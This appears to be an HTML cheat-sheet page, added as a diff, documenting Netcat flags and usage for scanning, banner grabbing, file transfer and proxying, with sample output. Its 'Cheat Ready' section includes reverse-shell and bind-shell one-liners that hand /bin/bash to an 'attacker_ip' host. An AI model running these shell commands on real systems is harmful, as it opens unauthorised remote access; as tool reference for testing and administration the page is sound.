@@ -1,0 +1,270 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Netcat (nc)</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network</strong> • Focus: <strong>Connection, Port Scanning & Data Transfer</strong> • Last Updated: <strong>2025-09-04</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Netcat (often called the “Swiss Army Knife” of networking) is a versatile command-line utility 
+    for reading and writing data across network connections using TCP or UDP. It can function as 
+    a port scanner, banner grabber, backdoor listener, file transfer tool, or even a simple chat 
+    client. Netcat is widely used by penetration testers, defenders, and administrators for quick 
+    troubleshooting and proof-of-concept exploits in both offensive and defensive workflows.
+  </p>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Install Netcat (commonly pre-installed on Linux/macOS; Windows versions available).</li>
+    <li>Identify target IP/port or choose a local port for listening.</li>
+    <li>Use Netcat in client mode (connect) or server mode (listen).</li>
+    <li>Run additional options for scanning, banner grabbing, file transfer, or reverse shells.</li>
+    <li>Interpret results and document findings for analysis or exploitation.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# Address Family
+-4                        # Force IPv4
+nc -4 example.com 80      # Connect using IPv4
+
+-6                        # Force IPv6
+nc -6 example.com 80      # Connect using IPv6
+
+-b                        # Allow broadcast
+nc -u -b 192.168.1.255 12345  # Send UDP broadcast
+
+
+# Connection Behavior
+-C                        # Send CRLF line endings
+echo "GET / HTTP/1.0" | nc -C example.com 80
+
+-D                        # Enable debug socket option
+nc -D example.com 80      # Debug TCP connection
+
+-d                        # Detach from stdin
+nc -d example.com 80      # Ignore input, just receive data
+
+-F                        # Pass socket fd (advanced use)
+nc -F -l -p 1234          # Pass socket as file descriptor
+
+-h                        # Show help
+nc -h                     # Print help text
+
+
+# Buffers & Timing
+-I length                 # Set TCP receive buffer length
+nc -I 4096 example.com 80 # Increase receive buffer
+
+-i interval               # Delay interval for lines/ports
+nc -i 2 -zv example.com 20-25  # Delay 2s between scans
+
+-M ttl                    # Outgoing TTL / Hop Limit
+nc -M 64 example.com 80   # Set TTL=64
+
+-m minttl                 # Minimum incoming TTL
+nc -m 2 example.com 80    # Require TTL>=2 to accept
+
+-O length                 # TCP send buffer length
+nc -O 2048 example.com 80 # Set send buffer
+
+-q secs                   # Quit after EOF + delay
+nc -q 5 example.com 80    # Close 5s after input ends
+
+-r                        # Randomize remote ports
+nc -r -zv example.com 20-25 # Randomize scan order
+
+-W recvlimit              # Terminate after N packets
+nc -u -W 3 example.com 53 # Stop after 3 UDP replies
+
+-w timeout                # Timeout for connect/read
+nc -w 3 example.com 22    # Timeout after 3 seconds
+
+
+# Listener / Mode
+-k                        # Keep open for multiple connects
+nc -lk -p 1234            # Accept multiple clients
+
+-l                        # Listen mode
+nc -l -p 9000             # Listen on port 9000
+
+-N                        # Shutdown after stdin EOF
+nc -N example.com 25      # Send mail then close
+
+-n                        # Numeric only (no DNS)
+nc -n 192.168.1.1 80      # Skip DNS resolution
+
+-S                        # Enable TCP MD5 signature
+nc -S example.com 80      # Use TCP MD5 (rare, advanced)
+
+-t                        # Answer TELNET negotiations
+nc -t example.com 23      # Handle Telnet negotiation
+
+-U                        # UNIX domain socket
+nc -U /tmp/socket          # Connect via UNIX socket
+
+-u                        # UDP mode
+nc -u example.com 53      # Connect via UDP
+
+-V rtable                 # Alternate routing table
+nc -V 2 example.com 80    # Use rtable 2
+
+
+# Address & Proxy
+-P proxyuser              # Proxy username
+nc -x 127.0.0.1:1080 -X 5 -P user example.com 80
+
+-p port                   # Source port
+nc -p 4444 example.com 80 # Connect from port 4444
+
+-s sourceaddr             # Source address
+nc -s 192.168.1.100 example.com 80
+
+-T keyword                # TOS value (IP QoS)
+nc -T lowdelay example.com 80
+
+-X proto                  # Proxy protocol ("4","5","connect")
+nc -x 127.0.0.1:1080 -X 5 example.com 80
+
+-x addr[:port]            # Proxy address
+nc -x 127.0.0.1:1080 example.com 80
+
+
+# Modes
+-v                        # Verbose output
+nc -v example.com 80      # Show connection details
+
+-Z                        # DCCP mode (if supported)
+nc -Z example.com 80      # Use DCCP instead of TCP
+
+-z                        # Zero-I/O mode (port scan)
+nc -zv example.com 20-100 # Scan ports 20–100
+
+
+# Example Usage
+nc -vz 192.168.1.1 22-25           # Quick port scan with verbose output
+nc -l -p 4444                      # Bind shell listener on port 4444
+nc 192.168.1.10 4444               # Connect to bind shell
+echo "Hello" | nc -q 1 example.com 80  # Send data then quit after 1s
+nc -u -b 192.168.1.255 12345       # UDP broadcast message
+  </pre>
+</section>
+<!-- Best Flag Combinations (Cheat Ready) — Netcat -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Best Flag Combinations (Cheat Ready)</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# Quick TCP port scan (common use in CTFs)
+nc -zv 192.168.1.10 20-100             # Verbose scan of ports 20–100
+
+# UDP port scan
+nc -zvu 192.168.1.10 53                # Check if UDP/53 is open
+
+# Banner grabbing (fingerprinting)
+nc -v example.com 21                   # Grab FTP banner
+nc -v example.com 25                   # Grab SMTP banner
+
+# Simple chat between two systems
+# Server
+nc -l -p 5000                          # Listen on port 5000
+# Client
+nc 192.168.1.10 5000                   # Connect to chat server
+
+# File transfer (Linux/Unix)
+# Sender
+nc -w 3 192.168.1.20 1234 < file.txt   # Send file
+# Receiver
+nc -l -p 1234 > file.txt               # Receive file
+
+# Reverse shell
+# Victim
+nc attacker_ip 4444 -e /bin/bash       # Connect back with bash
+# Attacker
+nc -l -p 4444                          # Listen for shell
+
+# Bind shell
+# Victim
+nc -l -p 4444 -e /bin/bash             # Expose shell
+# Attacker
+nc victim_ip 4444                      # Connect to victim
+
+# Web request (manual HTTP GET)
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+
+# Broadcast UDP (network-wide message)
+echo "hello LAN" | nc -u -b 192.168.1.255 12345
+
+# Proxy usage (SOCKS5)
+nc -x 127.0.0.1:9050 -X 5 example.com 80   # Connect via SOCKS5 proxy
+
+# Persistent listener (multiple clients)
+nc -lk -p 9000                          # Keep socket open for reuse
+
+# Encrypted tunnels with OpenSSL + Netcat
+openssl s_server -quiet -accept 443 | nc -l -p 9000   # Secure tunnel listener
+openssl s_client -connect target:443 | nc target 9000 # Tunnel client
+
+  </pre>
+</section>
+
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://linux.die.net/man/1/nc" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Netcat Manual (Linux man page)
+      </a>
+    </li>
+    <li>
+      <a href="https://nmap.org/ncat/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        Ncat (Nmap’s Enhanced Netcat)
+      </a>
+    </li>
+    <li>Netcat is included in many pentesting distributions (Kali Linux, Parrot OS) and is often used in CTFs.</li>
+  </ul>
+</section>
+<br>
+<!-- Example Result (Toggle) — Netcat -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <details class="group">
+    <summary class="cursor-pointer text-gray-200 font-semibold">Example Result of Netcat</summary>
+    <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto text-gray-300 mt-3">
+
+[saide ~]$ nc -zv 192.168.1.10 22 80 443
+Connection to 192.168.1.10 22 port [tcp/ssh] succeeded!
+Connection to 192.168.1.10 80 port [tcp/http] succeeded!
+Connection to 192.168.1.10 443 port [tcp/https] succeeded!
+
+[saide ~]$ nc -v example.com 25
+Connection to example.com 25 port [tcp/smtp] succeeded!
+220 mail.example.com ESMTP Postfix
+
+[saide ~]$ nc -l -p 9000
+Hello from client!
+Hi back from server!
+
+[saide ~]$ echo "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+HTTP/1.1 200 OK
+Date: Thu, 04 Sep 2025 16:23:18 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+<html><body><h1>It works!</h1></body></html>
+
+    </pre>
+  </details>
+</section>
